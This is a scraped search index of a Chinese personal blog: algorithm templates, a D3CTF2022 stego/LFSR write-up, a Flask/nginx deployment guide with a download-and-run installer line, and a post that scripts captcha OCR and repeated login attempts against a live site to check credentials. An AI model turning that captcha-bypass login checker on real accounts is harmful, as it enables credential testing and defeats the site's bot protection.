o[l]; int s = t[L(tr)].v - t[L(tl)].v; return k \u003c= s ? query(L(tl), L(tr), l, mid, k) : query(R(tl), R(tr), mid+1, r, k-s); } int main() { read(n); read(m); for(int i = 1; i \u003c= n; ++i) read(a[i]), o[i] = a[i]; sort(o+1, o+n+1); int _n = unique(o+1, o+n+1)-o-1; build(rt[0], 1, _n); for(int i = 1; i \u003c= n; ++i) update(rt[i], rt[i-1], 1, _n, lower_bound(o+1, o+_n+1, a[i])-o, 1); for(int l, r, k; m--; ) { read(l); read(r); read(k); printf(\"%d\\n\", query(rt[l-1], rt[r], 1, _n, k)); } } ","date":"2022-03-09","objectID":"/templates/:31:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"GCD-BlackMagic int gcd(int a, int b) { int g = 1; for(int tmp, i = 0; i \u003c 3; b /= tmp, g *= tmp, ++i) tmp = (k[a][i] \u003e siz) ? (b % k[a][i] == 0 ? k[a][i] : 1) : _gcd[k[a][i]][b%k[a][i]]; return g; } int main() { k[1][0] = k[1][1] = k[1][2] = 1; notp[1] = 1; for(int i = 2; i \u003c= V; ++i) { if(!notp[i]) p[++cnt] = i, k[i][2] = i, k[i][1] = k[i][0] = 1; for(int j = 1; p[j] * i \u003c= V; ++j) { notp[i * p[j]] = 1; int *t = k[i*p[j]]; t[0] = k[i][0] * p[j]; t[1] = k[i][1]; t[2] = k[i][2]; if(t[1] \u003c t[0]) swap(t[0], t[1]); if(t[2] \u003c t[1]) swap(t[1], t[2]); if(i % p[j] == 0) break; } } for(int i = 1; i \u003c= siz; ++i) _gcd[i][0] = _gcd[0][i] = i; for(int _max = 1; _max \u003c= siz; ++_max) for(int i = 1; i \u003c= _max; ++i) _gcd[i][_max] = _gcd[_max][i] = _gcd[_max % i][i]; ","date":"2022-03-09","objectID":"/templates/:32:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"FFT struct Complex { double x, y; Complex(double xx = 0, double yy = 0) {x = xx; y = yy;} Complex operator + (Complex \u0026b) const {return Complex(x+b.x, y+b.y);} Complex operator - (Complex \u0026b) const {return Complex(x-b.x, y-b.y);} Complex operator * (Complex \u0026b) const {return Complex(x*b.x-y*b.y, y*b.x+x*b.y);} } a[MAXN], b[MAXN]; int r[MAXN], n, m, l, limit; void FFT (Complex *A, int t) { for(int i = 0; i \u003c limit; ++i) if(i \u003c r[i]) swap(A[i], A[r[i]]); for(int mid = 1; mid \u003c limit; mid \u003c\u003c= 1) { Complex Wn = Complex(cos(Pi/mid), t * sin(Pi/mid)); for(int R = mid\u003c\u003c1, j = 0; j \u003c limit; j += R) { Complex w = Complex(1, 0); for(int k = 0; k \u003c mid; ++k, w = w * Wn) { Complex x = A[j+k], y = w*A[j+mid+k]; A[j+k] = x+y; A[j+mid+k] = x-y; } } } } int main() { n = read(); m = read(); for(int i = 0; i \u003c= n; ++i) a[i].x = read(); for(int i = 0; i \u003c= m; ++i) b[i].x = read(); for(limit = 1; limit \u003c= n+m; limit \u003c\u003c= 1, ++l); for(int i = 0; i \u003c limit; ++i) r[i] = (r[i\u003e\u003e1]\u003e\u003e1)|((i\u00261)\u003c\u003c(l-1)); FFT(a, 1); FFT(b, 1); for(int i = 0; i \u003c= limit; ++i) a[i] = a[i]*b[i]; FFT(a, -1); for(int i = 0; i \u003c= n+m; ++i) printf(\"%d \", (int)(a[i].x/limit+0.5)); puts(\"\"); } ","date":"2022-03-09","objectID":"/templates/:33:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"多项式 #include\u003cbits/stdc++.h\u003e#define ll long long #define FIO \"loj150\" using namespace std; const int N=1e5+5,MOD=998244353,P=19,INV2=MOD+1\u003e\u003e1; inline int add(int a,const int \u0026b){if((a+=b)\u003e=MOD)a-=MOD;return a;} inline int sub(int a,const int \u0026b){if((a-=b)\u003c 0)a+=MOD;return a;} inline int mul(const int \u0026a,const int \u0026b){return 1ll*a*b%MOD;} inline void inc(int \u0026a,const int \u0026b=1){a=add(a,b);} inline void dec(int \u0026a,const int \u0026b=1){a=sub(a,b);} inline void pro(int \u0026a,const int \u0026b){a=mul(a,b);} inline int qpow(int a,int b){int c=1;for(;b;b\u003e\u003e=1,pro(a,a))if(b\u00261)pro(c,a);return c;} int n,k,w[2][1\u003c\u003cP]; inline void pre(){ for(int i=1;i\u003c1\u003c\u003cP;i\u003c\u003c=1){ w[0][i]=w[1][i]=1; int wn1=qpow(3,(MOD-1)/(i\u003c\u003c1)),wn0=qpow(wn1,MOD-2); for(int j=1;j\u003ci;j++) w[0][i+j]=mul(w[0][i+j-1],wn0),w[1][i+j]=mul(w[1][i+j-1],wn1); } } #define poly vector\u003cint\u003e inline void read(poly \u0026a,const int \u0026n){ a.resize(n); for(int i=0;i\u003cn;i++)scanf(\"%d\",\u0026a[i]); } inline void out(const poly \u0026a){ for(int i=0,n=a.size();i\u003cn;i++)printf(\"%d%c\",a[i],i^n-1?' ':'\\n'); } inline void clear(poly \u0026a){ int n=a.size(); while(n\u003e1\u0026\u0026!a[n-1])n--; a.resize(n); } inline poly operator +(poly a,const int \u0026b){inc(a[0],b);return a;} inline poly operator +(const int \u0026b,poly a){inc(a[0],b);return a;} inline poly operator -(poly a,const int \u0026b){dec(a[0],b);return a;} inline poly operator -(const int \u0026b,poly a){dec(a[0],b);return a;} inline poly operator +(poly a,const poly \u0026b){ if(a.size()\u003cb.size())a.resize(b.size()); for(int i=0,n=a.size();i\u003cn;i++)inc(a[i],b[i]); return a; } inline poly operator -(poly a,const poly \u0026b){ if(a.size()\u003cb.size())a.resize(b.size()); for(int i=0,n=a.size();i\u003cn;i++)dec(a[i],b[i]); return a; } inline void ntt(int *f,int opt,int l){ poly rev(l); for(int i=0;i\u003cl;i++){rev[i]=(rev[i\u003e\u003e1]\u003e\u003e1)|((i\u00261)*(l\u003e\u003e1));if(i\u003crev[i])swap(f[i],f[rev[i]]);} for(int i=1;i\u003cl;i\u003c\u003c=1) for(int j=0;j\u003cl;j+=i\u003c\u003c1) for(int k=0;k\u003ci;k++){ int x=f[j+k],y=mul(f[i+j+k],w[opt][i+k]); f[j+k]=add(x,y); f[i+j+k]=sub(x,y); } if(opt)for(int i=0,inv=qpow(l,MOD-2);i\u003cl;i++)pro(f[i],inv); } inline poly operator *(poly a,poly b){ int n=a.size(),m=b.size(),l=1; while(l\u003cn+m)l\u003c\u003c=1; a.resize(l);b.resize(l); ntt(\u0026a[0],0,l);ntt(\u0026b[0],0,l); for(int i=0;i\u003cl;i++)pro(a[i],b[i]); ntt(\u0026a[0],1,l); clear(a); return a; } inline poly\u0026 operator *=(poly \u0026a,const poly b){return a=a*b;} inline poly operator *(poly a,const int \u0026b){ for(int i=0,n=a.size();i\u003cn;i++)pro(a[i],b); return a; } inline poly inv(const poly \u0026a,const int \u0026n){ if(n==1)return poly(1,qpow(a[0],MOD-2)); int l=1;while(l\u003c=n\u003c\u003c1)l\u003c\u003c=1; poly b=inv(a,n+1\u003e\u003e1),c(l);b.resize(l); for(int i=0;i\u003cn;i++)c[i]=a[i]; ntt(\u0026b[0],0,l);ntt(\u0026c[0],0,l); for(int i=0;i\u003cl;i++)pro(b[i],sub(2,mul(b[i],c[i]))); ntt(\u0026b[0],1,l); b.resize(n); clear(b); return b; } inline poly inv(const poly \u0026a){return inv(a,a.size());} int B; #define pii pair\u003cint,int\u003e inline pii operator *(pii a,pii b){ return pii(add(mul(a.first,b.first),mul(mul(a.second,b.second),B)),add(mul(a.first,b.second),mul(a.second,b.first))); } inline pii qpow(pii a,int b){pii c=pii(1,0);for(;b;b\u003e\u003e=1,a=a*a)if(b\u00261)c=c*a;return c;} inline int remain(int x){ if(x\u003c=1)return x; int a=mul(mul(rand(),rand()),rand()); while(qpow(B=sub(mul(a,a),x),MOD-1\u003e\u003e1)==1)a=mul(mul(rand(),rand()),rand()); pii A=pii(a,1),ans=qpow(A,MOD+1\u003e\u003e1); return min(ans.first,MOD-ans.first); } inline poly sqrt(const poly \u0026a,const int \u0026n){ if(n==1)return poly(1,remain(a[0])); int l=1;while(l\u003c=n\u003c\u003c1)l\u003c\u003c=1; poly b=sqrt(a,n+1\u003e\u003e1),c(l),d; b.resize(n);d=inv(b)*INV2; b.resize(l);d.resize(l); for(int i=0;i\u003cn;i++)c[i]=a[i]; ntt(\u0026b[0],0,l);ntt(\u0026c[0],0,l);ntt(\u0026d[0],0,l); for(int i=0;i\u003cl;i++)b[i]=mul(d[i],add(mul(b[i],b[i]),c[i])); ntt(\u0026b[0],1,l); b.resize(n); clear(b); return b; } inline poly sqrt(const poly \u0026a){return sqrt(a,a.size());} inline poly deri(poly a){ int n=a.size(); if(n==1)return poly(1,0); for(int i=0;i\u003cn;i++)a[i]=mul(a[i+1],i+1); a.resize(n-1); return a; } inline poly inte(poly a){ int n=a.size(); a.resize(n+1); for(int i=n;i;i--)a[i]=mul(a[i-1],qpow(i,MOD-2)); a[0]=0; return a; } inl","date":"2022-03-09","objectID":"/templates/:34:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"珂朵莉树 //以防我忘了set迭代器怎么写 struct node { int l, r; mutable lint v; node(int L, int R = -1, lint V = 0) : l(L), r(R), v(V) {} bool operator \u003c (const node \u0026o) const { return l \u003c o.l; } }; set \u003cnode\u003e s; IT spilit (int pos) { IT it = s.lower_bound(node(pos)); if(it != s.end() \u0026\u0026 it-\u003el == pos) return it; it--; int L = it -\u003e l, R = it -\u003e r; lint V = it-\u003ev; s.erase(it); s.insert(node(L, pos-1, V)); return s.insert(node(pos, R, V)).first; } void add(int l, int r, int val) { IT il = spilit(l), ir = spilit(r+1); for(; il != ir; il-\u003ev += val, il++); } void tp(int l, int r, int val = 0) { IT il = spilit(l), ir = spilit(r+1); s.erase(il, ir); s.insert(node(l, r, val)); } ","date":"2022-03-09","objectID":"/templates/:35:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"BadW3ter 当时打题目名字的时候也没有多想，后来发现Water拼错了，笑死。 文件名后面的md5码可以解出来Sh1n0，是我为了混淆题目文件名随便弄的和题目没有关系（一般会去解文件名吗，还是个md5） 发现文件头被篡改（我超，初音未来） 这里只改了RIFF区块前后和FORMAT区块开头的标识符，可以相对容易地恢复成正常的文件格式，并且得到字符串CUY1nw31lai 根据题目提示「Dive into」the w3ter, deeper and deeper.使用DeepSound解密，密码为CUY1nw31lai得到一个flag.png，直接扫发现被骗了。 查看文件头，发现并不是一个PNG文件。结合开头的II*标识和大量的Adobe Photoshop注释信息可以推测出是TIF存储格式，改后缀名后用Adobe Photoshop打开。 事实上，当文件后缀不正确的时候Photoshop是无法打开此图片的（如下图） 所以也可以把所有的图片文件后缀都试一遍（？ 发现图片包含一张透明底的二维码图片和一个白底。通过大眼观察（或是Stegsolve之类的工具）是可以发现前景的二维码图片并不是纯黑的，并且颜色分布有一点微妙。在这里刻意的分层存储和非纯色的暗示意味已经非常明显了。 使用油漆桶工具将背景改为黑色。可以发现二维码内容发生了变化： 用魔棒之类的工具处理一下，扫描得到flag D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?} 参考：https://zhuanlan.zhihu.com/p/32532733 ","date":"2022-03-05","objectID":"/d3ctf2022/:1:0","tags":null,"title":"D3CTF2022wp-BadW3ter \u0026 d3bug","uri":"/d3ctf2022/"},{"categories":null,"content":"d3bug 这个题是拿出来当签到题的。首先通过简单分析一下题目可以得到一些限制条件，用SAT、z3solver等工具可以直接出解。 如果你不愿意使用这些工具的话： 观察到在lfsr_MyCode部分得到的每一位output相当于是前面所有位的异或和。每次移位时最高位会消失，直接把这两次得到的output随意简单异或一下就可以得到这一次消失的高位。 剩下的低位通过lfsr_CopiedfromInternet的结果可以得到一个模二加方程组（就是传统的lfsr做法），解一下就可以了 from Crypto.Util.number import * my = [0,0,1,0,0,1,1,0,0,0,1,0,0,0,1,1,0,0,0,1,1,0,1,0,1,0,1,0,1,0,0,1,0,0,1] std = [0,1,1,1,1,1,0,1,1,1,1,0,1,0,1,1,1,0,0,0,0,1,0,0,1,0,1,1,1,0,0,1,1,0,1] mask = [1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,1,0,0] highbits = [] def calculate_parameter(a, prm, n): for i in range(n): p = i for j in range(i+1, n): if a[j][i] \u003e a[p][i]: p = j for j in range(n+1): tmp = a[i][j] a[i][j] = a[p][j] a[p][j] = tmp for j in range(n): if not i == j: tt = a[j][i] * pow(a[i][i], prm-2, prm) for k in range(i, n+1): a[j][k] = (a[j][k] - a[i][k] * tt % prm + prm) % prm res = [] for i in range(n): res.append(a[i][n] * pow(a[i][i], prm-2, prm) % prm) return res for i in range(1, 34): my[i] ^= my[i-1] for i in range(1, 34): highbits.append(my[i]^my[i-1]) basepos = 0 bb = [] for i in range(31): res = std[i] aa = [] for j in range(33-basepos): if mask[j] == 1: res ^= highbits[j+basepos] k = 33-basepos for j in range(31): aa.append(mask[k]) k += 1 cnt = 0 while k \u003c 64: if mask[k] == 1: res ^= std[cnt] cnt += 1 k += 1 aa.append(res) bb.append(aa) basepos += 1 lowbits = calculate_parameter(bb, 2, 31) flag = 0 for i in range(33): flag = (flag \u003c\u003c 1) ^ highbits[i] for i in range(31): flag = (flag \u003c\u003c 1) ^ lowbits[i] print(long_to_bytes(flag)) 得到flag： D3CTF{LF5Rsuk!} ","date":"2022-03-05","objectID":"/d3ctf2022/:2:0","tags":null,"title":"D3CTF2022wp-BadW3ter \u0026 d3bug","uri":"/d3ctf2022/"},{"categories":null,"content":"目标需求 因为某种原因，我需要实现一个验证某组用户名和密码是否可以成功登录网站的模块。 这里的目标网站是icoding.run. 拟使用python requests模块伪造数据包来达成目标. ","date":"2022-02-07","objectID":"/captcha/:1:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"数据包分析 使用BurpSuite截获发送的数据包.比较关键的是以下两个数据包: ","date":"2022-02-07","objectID":"/captcha/:2:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"请求验证码 GET /verificationCode HTTP/1.1 Host: icoding.run Sec-Ch-Ua: \"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\" Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Sec-Ch-Ua-Platform: \"Windows\" Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Referer: https://icoding.run/login Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 返回数据Headers: Server: nginx/1.18.0 (Ubuntu) Date: Mon, 07 Feb 2022 09:23:01 GMT Content-Type: image/jpeg Connection: close Set-Cookie: JSESSIONID=2ae541d8-248e-4cb7-ad45-9a5976222ed3; Path=/; HttpOnly Expires: Thu, 01 Jan 1970 00:00:00 GMT Cache-Control: no-store, no-cache, must-revalidate Cache-Control: post-check=0, pre-check=0 Pragma: no-cache Content-Length: 2127 返回数据的Content则是一张验证码图片. ","date":"2022-02-07","objectID":"/captcha/:2:1","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"登录 POST /login HTTP/1.1 Host: icoding.run Cookie: JSESSIONID=bbcb8c2f-e0f5-4786-b00f-19135c215909 Content-Length: 61 Sec-Ch-Ua: \"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Sec-Ch-Ua-Platform: \"Windows\" Origin: https://icoding.run Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://icoding.run/login Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close username=*******\u0026password=******\u0026verification=8195 会返回登录是否成功以及失败原因（密码错误或验证码错误等） ","date":"2022-02-07","objectID":"/captcha/:2:2","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"分析 对于请求验证码的数据包，我们只需要直接模拟发送就可以得到验证码图片。值得关注的是返回Headers的这一行： Set-Cookie: JSESSIONID=2ae541d8-248e-4cb7-ad45-9a5976222ed3; Path=/; HttpOnly JSESSIONID是一个起用户标识作用的字段，在模拟发送登录数据包时我们需要同时发送这个字段。 因此我们的设计逻辑就比较清晰了： 发送GET请求获得验证码图片和JSESSIONID 识别验证码 发送POST请求获得返回值 ","date":"2022-02-07","objectID":"/captcha/:2:3","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"请求验证码和JSESSIONID 这部分是相对比较好实现的。 我们需要把收到的验证码保存到某个文件中。但考虑到可能的并发问题，这里选择使用随机文件名来防止两个进程同时对一个文件进行读写，这里选择使用一个随机的字符串作为文件名。 def GenerateFilename(): return r''.join(random.sample(string.ascii_letters + string.digits, 16)) def getCaptcha(): url = \"https://icoding.run/verificationCode\" resp = requests.get(url) #事实证明根本不需要Headers，笑死 sessionid = resp.headers['Set-Cookie'] src = r'captchas/' + GenerateFilename() + r'.png' f = open(src, 'wb') f.write(resp.content) f.close() code = captcha.recognize_text(src) #对图片进行一个识别，将在后文介绍。 os.remove(src) #防止垃圾文件堆积，在识别过后删除文件 return code, sessionid ","date":"2022-02-07","objectID":"/captcha/:3:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"识别验证码 ","date":"2022-02-07","objectID":"/captcha/:4:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"找轮子 从文章：《Python代码实现验证码识别，很稳》中拿到一个现成的轮子： import cv2 as cv import pytesseract from PIL import Image def recognize_text(image): # 边缘保留滤波 去噪 dst = cv.pyrMeanShiftFiltering(image, sp=10, sr=150) # 灰度图像 gray = cv.cvtColor(dst, cv.COLOR_BGR2GRAY) # 二值化 ret, binary = cv.threshold(gray, 0, 255, cv.THRESH_BINARY_INV | cv.THRESH_OTSU) # 形态学操作 腐蚀 膨胀 erode = cv.erode(binary, None, iterations=2) dilate = cv.dilate(erode, None, iterations=1) cv.imshow('dilate', dilate) # 逻辑运算 让背景为白色 字体为黑 便于识别 cv.bitwise_not(dilate, dilate) cv.imshow('binary-image', dilate) # 识别 test_message = Image.fromarray(dilate) text = pytesseract.image_to_string(test_message) print(f'识别结果：{text}') src = cv.imread(r'./test/044.png') cv.imshow('input image', src) recognize_text(src) cv.waitKey(0) cv.destroyAllWindows() 思路是先处理图片，然后直接进行一个OCR。 直接拿来进行一个跑，啥都识别不出来！把图片处理结果打出来一看，我都看不懂！ 其实也不是这个轮子有啥问题，就是这个图片处理方式的特异性比较强，只适用于某种方式生成的验证码。对于图片结构不太一样的验证码这种处理方式就会当场去世了。 虽然但是，我们只需要针对icoding验证码来去除干扰（小黑线小点点啥的）就可以了。 ","date":"2022-02-07","objectID":"/captcha/:4:1","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"安装依赖库 pip install pytesseract pip install opencv-python sudo apt-get install tesseract-ocr pip install pillow ","date":"2022-02-07","objectID":"/captcha/:4:2","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"造轮子 上面那个轮子提供的图片处理基本不能作为参考。观察到验证码的主题部分为蓝色系，干扰部分是黑色的丝丝，考虑进行一个颜色的筛选，留住比较蓝的部分，去除其他部分： img = Image.open(src).convert(\"RGB\") width, height = img.size LIM = 100 LIM2 = 0.4 for i in range(width): for j in range(height): R, G, B = pix = img.getpixel((i, j)) sigma = R+G+B if sigma == 0: img.putpixel((i, j), (255, 255, 255)) continue B /= sigma if B \u003e= LIM2 and sigma \u003e= LIM: img.putpixel((i, j), (0, 0, 0)) else: img.putpixel((i, j), (255, 255, 255)) 这里是直接根据RGB色号进行了筛选。设定了两个筛选条件： RGB中蓝色占比大于某一阈值 颜色不要太深（过滤黑色） 这样筛选完可以基本得到验证码的主体部分。但是现在的识别失败率依然非常高，问题在于在黑线挡住蓝色的场景下，可能会有数字被“一分为二”导致识别失败。 参考了一下刚刚的轮子，考虑套用pyrMeanShiftFiltering方法：Opencv均值漂移来让主体部分”侵蚀“掉面积较小的干扰断层。 最后使用pytesseract直接进行一个OCR识别，返回识别结果。 import cv2 as cv import pytesseract from PIL import Image def recognize_text(src): img = Image.open(src).convert(\"RGB\") width, height = img.size LIM = 100 LIM2 = 0.4 for i in range(width): for j in range(height): R, G, B = pix = img.getpixel((i, j)) sigma = R+G+B if sigma == 0: img.putpixel((i, j), (255, 255, 255)) continue B /= sigma if B \u003e= LIM2 and sigma \u003e= LIM: img.putpixel((i, j), (0, 0, 0)) else: img.putpixel((i, j), (255, 255, 255)) img.save(src) image = cv.imread(src) #这里的交接应该有更好的传递方式？ dst = cv.pyrMeanShiftFiltering(image, sp=6, sr=0) test_message = Image.fromarray(dst) text = pytesseract.image_to_string(test_message) return text 到这里我们的验证码识别成功率已经可以满足需求了。 ","date":"2022-02-07","objectID":"/captcha/:4:3","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"模拟登录 意思就是获得验证码和JSSESIONID之后把数据包抄一遍发过去。我也懒得管headers里哪些是不需要的了发就完事了 def trylogin(username, password): code, sessionid = getCaptcha() url = \"https://icoding.run/login\" #print(sessionid) headers = { 'Cookie': sessionid, 'Content-Length': '61', 'Sec-Ch-Ua': '\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Sec-Ch-Ua-Mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Sec-Ch-Ua-Platform': '\"Windows\"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' } data = \"username=\"+username+\"\u0026password=\"+password+\"\u0026verification=\"+str(code[:4]) #print(data.encode()) resp = requests.post(url, headers = headers, data = data) return resp.content 但是由于我们的验证码识别并不是100%准确，这样的登录尝试很可能返回”验证码错误“，故考虑使用多次试登录的方法。 def login(username, password): for i in range(50): args = json.loads(trylogin(username, password).decode('utf-8')) #print(args['status']) #print(args['msg'][0]) if args['status'] == 200: return True, 200 elif args['msg'][0] != '验': #不是验证码错误，说明账号密码有问题 return False, 200 return False, 500 #尝试超时 至此大功告成。 ","date":"2022-02-07","objectID":"/captcha/:5:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"完整代码 import requests import string import os import random import json import cv2 as cv import pytesseract from PIL import Image def recognize_text(src): img = Image.open(src).convert(\"RGB\") width, height = img.size LIM = 100 LIM2 = 0.4 for i in range(width): for j in range(height): R, G, B = pix = img.getpixel((i, j)) #print(R, G, B) sigma = R+G+B if sigma == 0: img.putpixel((i, j), (255, 255, 255)) continue B /= sigma if B \u003e= LIM2 and sigma \u003e= LIM: img.putpixel((i, j), (0, 0, 0)) else: img.putpixel((i, j), (255, 255, 255)) img.save(src) image = cv.imread(src) dst = cv.pyrMeanShiftFiltering(image, sp=6, sr=0) cv.imwrite(\"tmp.jpg\", dst) test_message = Image.fromarray(dst) text = pytesseract.image_to_string(test_message) return text def GenerateFilename(): return r''.join(random.sample(string.ascii_letters + string.digits, 16)) def getCaptcha(): url = \"https://icoding.run/verificationCode\" resp = requests.get(url) sessionid = resp.headers['Set-Cookie'] src = r'captchas/' + GenerateFilename() + r'.png' f = open(src, 'wb') f.write(resp.content) f.close() code = recognize_text(src) os.remove(src) return code, sessionid def trylogin(username, password): code, sessionid = getCaptcha() url = \"https://icoding.run/login\" headers = { 'Cookie': sessionid, 'Content-Length': '61', 'Sec-Ch-Ua': '\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Sec-Ch-Ua-Mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Sec-Ch-Ua-Platform': '\"Windows\"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' } data = \"username=\"+username+\"\u0026password=\"+password+\"\u0026verification=\"+str(code[:4]) resp = requests.post(url, headers = headers, data = data) return resp.content def login(username, password): for i in range(50): args = json.loads(trylogin(username, password).decode('utf-8')) if args['status'] == 200: return True, 200 elif args['msg'][0] != '验': return False, 200 return False, 500 ","date":"2022-02-07","objectID":"/captcha/:6:0","tags":null,"title":"记一次模拟登陆和验证码绕过","uri":"/captcha/"},{"categories":null,"content":"整体架构 （图源网络） 其中App是“应用程序”部分，负责实现功能。 WSGI，全称Web Server Gateway Interface，是Web服务器（Server）和Web应用程序（App）之间一个沟通的桥梁，是一种通信协议。 而Server则是Web服务器，负责接受来自外部的消息并通过WSGI转发给app进行处理。 ","date":"2022-02-05","objectID":"/api/:1:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"需要的组件 ","date":"2022-02-05","objectID":"/api/:2:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"Python3 我这里是使用阿里云的Ubuntu20.04系统镜像，自带Python环境。如果你没有Python环境，请使用百度安装一个吧 ","date":"2022-02-05","objectID":"/api/:2:1","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"Flask Flask是一个轻量级的Python web应用框架，在架构中协助我们进行APP部分的开发。 pip install flask pip install flask_restful ","date":"2022-02-05","objectID":"/api/:2:2","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"Nginx Nginx是一个轻量级的Web服务器，在整体架构中负责Server部分。 sudo apt-get install nginx ","date":"2022-02-05","objectID":"/api/:2:3","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"uwsgi uWSGI是一个实现了WSGI协议的Web服务器。 相比于uwsgi，Nginx具备更优秀的静态内容处理能力，然后将动态内容转发给uWSGI服务器，这样可以达到相比于只用uwsgi而不使用Nginx更好的客户端相应。 pip insall uwsgi ","date":"2022-02-05","objectID":"/api/:2:4","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"宝塔Linux面板 非必须，一个辅助工具，可以帮助你更快地编辑和管理文件。 这是宝塔官网，可以在上面找到对应系统镜像的安装脚本：https://www.bt.cn/download/linux.html 如果你和我一样使用Ubuntu，直接执行以下命令吧： wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh \u0026\u0026 sudo bash install.sh 执行完成后在服务器上执行bt来配置用户名和密码。 执行/etc/init.d/bt default查看面板入口，一般是你的ip:8888/xxxxxx的形式并访问，用上一步设置的用户名密码登录。 ","date":"2022-02-05","objectID":"/api/:2:5","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"基于Flask的api编写 ","date":"2022-02-05","objectID":"/api/:3:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"初始化Flask API from flask import Flask from flask_restful import Resource, Api, reqparse app = Flask(__name__) api = Api(app) ","date":"2022-02-05","objectID":"/api/:3:1","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"创建端点 假设我们最后的API结果位于网站http://www.sh1no.icu，现在我们想要实现请求http://www.sh1no.icu/query来进行某种交互，则/query便称作我们的一个API端点。 为了创建端点，我们需要定义一个Python类，然后用app.addresource将其连接到所需的端点。 class Query(Resource): #Methods pass api.add_resource(Query, '/query') ","date":"2022-02-05","objectID":"/api/:3:2","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"运行本地Server 这一切结束后，我们需要将它托管至本地进行测试。 if __name__ == '__main__': app.run(debug = True, host=\"0.0.0.0\", port=3773) ","date":"2022-02-05","objectID":"/api/:3:3","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"编写API 这里以常用的post方法为例（其他方法大同小异）。我们在刚才创建的类中尝试创建一个post方法： class Query(Resource): 